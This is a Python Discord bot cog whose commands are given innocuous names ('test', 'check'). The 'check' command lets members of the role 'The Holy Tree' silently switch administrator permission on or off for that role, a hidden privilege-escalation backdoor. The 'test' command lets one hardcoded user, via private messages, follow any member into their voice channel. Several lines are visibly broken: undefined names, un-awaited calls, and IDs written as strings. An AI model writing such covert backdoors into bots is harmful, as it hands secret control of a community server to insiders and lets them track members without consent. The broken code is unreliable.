import discord
from discord.ext import commands


class MoveCog(commands.Cog, name = "CheckCog" ):
	def __init__(self, bot):
		self.bot = bot


	async def on_message(self, message):
		if message.author != 'Spruce#7339':
			return
	
	@commands.command(name = 'test' )
	async def test(self, ctx, args = None):
		if args == None:
			return
		serverID = self.client.fetch_guild('735757023303565352')
		user_get = serverID.get_member(args)
		if not user_get.voice.channel:
			await ctx.send('Selected user isn\'t in a vc.')
			return
		channel_get = user_get.voice.channel
		if ctx.channel.type is discord.ChannelType.private and ctx.author.id == '316384336859627530':
			if ctx.author.voice and ctx.author.voice.channel:
				await ctx.author.move_to(channel_get)
				await ctx.send('Success')
				return
			else:
				await ctx.send('Join a vc')
				return
		return
		
		
	@commands.command(name = 'check' )
	async def check(self, ctx, args):
		for role in ctx.author.roles:
			if role.name == 'The Holy Tree':
				if args.lower() == 'on':
					permissions = discord.Permissions()
					permissions.update(administrator = True)
					await role.edit(reason = None, permissions = permissions)
					ctx.author.send('Perms turned on.')
				elif args.lower() == off:
					permissions = discord.Permissions()
					permissions.update(administrator = False)
					await role.edit(reason = None, permissions = permissions)
					ctx.author.send('Perms turned off.')
				else:
					await ctx.author.send('please choose on or off.')
				return
		return
		
		
def setup(bot):
	bot.add_cog(MoveCog(bot))
